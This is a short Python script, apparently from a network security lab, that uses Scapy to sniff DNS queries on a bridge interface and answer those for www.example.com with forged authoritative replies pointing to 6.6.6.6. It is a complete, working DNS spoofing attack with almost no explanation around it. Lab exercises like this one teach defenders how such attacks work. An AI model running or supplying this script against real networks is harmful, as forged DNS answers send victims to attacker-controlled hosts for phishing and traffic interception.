#!/usr/bin/env python3
from scapy.all import *
import sys
NS_NAME="example.com"
def spoof_dns(pkt):
  if (DNS in pkt and "www.example.com" in pkt[DNS].qd.qname.decode('utf-8')):
    print(pkt.sprintf("{DNS:%IP.src%-->%IP.dst%: %DNS.id%}"))
    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Swap the source and destination port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='6.6.6.6')

    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=0, arcount=0,
                 an=Anssec)
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
#f = "udp and src host 10.9.0.5 and dst port 53"
f = "udp  and dst port 53"
#br-0a8cdae26a1f
pkt = sniff(iface="br-305f21823c0b", filter=f, prn=spoof_dns)      
